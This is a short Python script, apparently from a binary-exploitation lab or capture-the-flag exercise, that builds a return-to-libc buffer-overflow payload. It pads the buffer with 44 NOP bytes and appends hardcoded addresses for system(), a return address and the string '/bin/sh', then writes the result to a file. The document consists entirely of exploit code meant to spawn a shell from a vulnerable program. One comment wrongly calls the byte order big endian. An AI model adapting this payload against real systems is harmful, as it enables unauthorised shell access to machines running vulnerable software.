nopsled = b"\x90" * 44 #FIll in the buffer with NOPs until we reach the return address

address_of_system = b"\x30\x24\xdc\xf7" # In big endian we would have: 0x f7 dc 24 30

return_address_of_system = b"\xd0\x0b\xdb\xf7" #0x f7 db 0b d0

address_of_bin_sh = b"\xe8\x6d\xf3\xf7" #0x f7 f3 6d e8

payload = nopsled + address_of_system + return_address_of_system + address_of_bin_sh

# Write to file
with open("payload_secure", "wb") as f:
        f.write(payload)